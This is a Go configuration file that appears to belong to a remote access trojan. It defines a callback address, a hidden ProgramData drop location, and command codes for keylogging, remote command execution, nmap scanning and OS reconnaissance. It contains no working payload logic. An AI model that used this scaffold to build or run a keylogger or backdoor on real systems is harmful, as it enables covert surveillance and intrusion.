package config

const (
	IP                 = "127.0.0.1:9999"
	FILENAME           = "FileNameCHAOS"
	FOLDER_PATH        = "\\ProgramData"
	FOLDER_EXT         = "\\NameFolderExtesion"
	newLine     string = "\n"

	Result_Code_ReturnOsInfo = 1001

	Result_Code_StartKeyLogger   = 2001
	Result_Code_HasStartLogger   = 2002
	Result_Code_KeyLoggerNotOpen = 2003
	Result_Code_ReturnKeyLogger  = 2004

	Request_Code_Nmap            = 101
	Request_Code_GetRunGetOs     = 102
	Request_Code_RunRunGetOs     = 103
	Request_Code_KeyLogger_Start = 104
	Request_Code_KeyLogger_Show  = 105
	Request_Code_RunCmd          = 106

	Request_Code_Result_Code_Cmd = 6001

	Result_Code_Nmap = 3001
)
